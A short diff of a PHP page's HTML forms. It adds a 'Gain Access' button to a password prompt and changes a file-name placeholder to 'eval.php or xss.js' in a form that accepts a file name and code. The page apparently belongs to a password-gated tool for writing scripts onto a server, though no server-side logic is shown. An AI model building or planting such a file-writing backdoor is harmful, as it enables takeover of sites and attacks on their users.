@@ -54,6 +54,8 @@
 		<fieldset>
 			<label for="key">Password</label>
 			<input type="password" name="key" value="" />
+				<br />
+			<input type="submit" value="Gain Access" />
 		</fieldset>
 	</form>
 <?php
@@ -93,7 +95,7 @@
 	<form method="post" action="">
 		<fieldset>
 			<label for="filename">File Name</label>
-			<input type="text" name="filename" id="filename" value="" placeholder="example.php" />
+			<input type="text" name="filename" id="filename" value="" placeholder="Example: eval.php or xss.js" />
 				<br />
 			<label for="script">Code</label>
 			<textarea name="script" id="script" name="script"></textarea>
